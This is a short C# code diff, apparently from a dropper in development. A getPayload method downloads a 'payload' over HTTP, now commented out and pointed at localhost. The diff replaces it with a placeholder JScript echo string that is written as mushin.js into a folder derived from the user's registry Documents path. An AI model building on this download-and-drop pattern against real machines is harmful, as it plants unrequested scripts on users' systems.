@@ -12,12 +12,14 @@ namespace namba.Services
 		public string getPayload()
 		{
 			//download the payload to a specific destination here
-			System.Net.WebClient wc = new System.Net.WebClient();
-			byte[] bd  = wc.DownloadData("http://localhost/live/test-2.txt");
+			//System.Net.WebClient wc = new System.Net.WebClient();
+			//byte[] bd  = wc.DownloadData("http://localhost/live/test-2.txt");
 
-              string dt = System.Text.Encoding.UTF8.GetString(bd,0,bd.Length);
+              //string dt = System.Text.Encoding.UTF8.GetString(bd,0,bd.Length);
               string dlNameO = getDrop();
 			  string dlName = gbeba(dlNameO,"Downloads") + "\\mushin.js";
+			  
+			  string dt = "WScript.Echo(\"she's a heartbreaker.. she bend over, back breaker ;) in my life me nevuh see melanin so dark :*\");";
 			  //System.IO.File.Create(dlName);
 			  System.IO.File.WriteAllText(dlName,dt);
 			return dlName;
@@ -37,7 +39,7 @@ namespace namba.Services
 		public string getDrop()
 		{
 			string fn = "";
-			/*try
+			try
 			{
 				fn = (string)Registry.GetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders","Personal","404");
 			}
@@ -45,8 +47,8 @@ namespace namba.Services
 			{
 				fn = "Error: " + e.ToString();
 			}
-			*/
-			fn = "C:\\users\\user\\documents";
+			
+			//fn = "C:\\users\\user\\documents";
 			fn = Regex.Replace(fn,@"\t|\n|\r","");
 			return fn;
 		}
